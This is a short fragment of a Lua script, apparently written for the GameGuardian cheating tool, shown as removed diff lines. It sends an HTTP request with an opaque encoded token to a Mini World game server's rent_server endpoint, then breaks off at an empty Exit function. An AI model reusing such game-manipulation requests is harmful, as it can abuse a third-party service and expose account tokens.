-local zctij = gg.makeRequest("http://shequ.mini1.cn:8087/miniw/rent_server?s7=HPNfcoNwLK9UviLCsihJvmaJs1qGaoNfHoRfRTRJvXqCZPrhNFafZPqwc4WXy7dlNjyxp1HiHo3fZ1qia5R8N1g8ajwwH4OAa4R8aPd6NiWAN4Q8NjylN4sxpma7yTrhy4H7yjVXy7WlNFaqZP6hy4d7N1OiLi3Gc4WIN26ARiQlZPwSc4Wiv5QIa7flRiNJLPxfsTShrf6is7Lwc4W_&s7t=b31a4").content
-end
 
 
 function Exit()
